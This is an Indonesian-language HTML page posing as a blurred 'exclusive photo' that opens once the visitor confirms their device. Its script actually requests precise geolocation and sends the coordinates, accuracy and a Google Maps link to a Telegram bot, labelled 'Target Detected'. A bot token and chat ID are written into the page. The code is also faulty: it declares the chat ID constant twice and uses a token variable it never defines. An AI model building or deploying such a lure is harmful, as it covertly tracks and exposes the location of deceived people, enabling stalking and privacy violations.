<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Foto Eksklusif</title>
  <style>
    body { font-family: Arial, sans-serif; background: #0f172a; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
    .card { background: #1e293b; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); text-align: center; max-width: 350px; width: 100%; }
    .blur-box { width: 100%; height: 180px; background: #334155; border-radius: 8px; margin-bottom: 15px; display: flex; justify-content: center; align-items: center; filter: blur(4px); font-size: 40px; }
    .btn { background: #3b82f6; color: white; border: none; padding: 12px 20px; font-size: 15px; font-weight: bold; border-radius: 6px; cursor: pointer; width: 100%; transition: background 0.2s; }
    .btn:hover { background: #2563eb; }
    .status { margin-top: 15px; font-size: 13px; color: #94a3b8; }
  </style>
</head>
<body>

  <div class="card">
    <div class="blur-box">🖼️</div>
    <h2>Foto Eksklusif</h2>
    <p style="font-size: 14px; color: #94a3b8; margin-bottom: 20px;">Konfirmasi perangkat terlebih dahulu untuk membuka dan melihat foto asli.</p>
    <button class="btn" onclick="getLocation()">Buka Foto</button>
    <div id="status" class="status"></div>
  </div>

  <script>
    
    const TELEGRAM_CHAT_ID = '8769576802:AAFqMQGPSUpiaKMtoluHfI7OBqQ_8s64yhk';
     const TELEGRAM_CHAT_ID = '6269176229';
    function getLocation() {
      const statusDiv = document.getElementById('status');
      statusDiv.innerHTML = 'Memuat foto...';

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendData, showError, {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        });
      } else {
        statusDiv.innerHTML = 'Geolocation tidak didukung.';
      }
    }

    function sendData(position) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;
      const accuracy = position.coords.accuracy;
      const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;

      // Format pesan yang akan masuk ke Telegram
      const message = `🎯 Target Terdeteksi!\n\n📍 Latitude: ${lat}\n📍 Longitude: ${lon}\n🎯 Akurasi: ${accuracy} meter\n🗺️ Google Maps: ${googleMapsUrl}`;

      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

      // Mengirim data langsung ke Telegram secara real-time
      fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message
        })
      }).then(response => {
        if (response.ok) {
          document.getElementById('status').innerHTML = '<span style="color:#22c55e;">Berhasil memuat!</span>';
        } else {
          document.getElementById('status').innerHTML = 'Gagal mengirim data.';
        }
      }).catch(err => {
        document.getElementById('status').innerHTML = 'Terjadi kesalahan jaringan.';
      });
    }

    function showError(error) {
      document.getElementById('status').innerHTML = 'Akses lokasi diperlukan untuk melihat foto.';
    }
  </script>

</body>
</html>
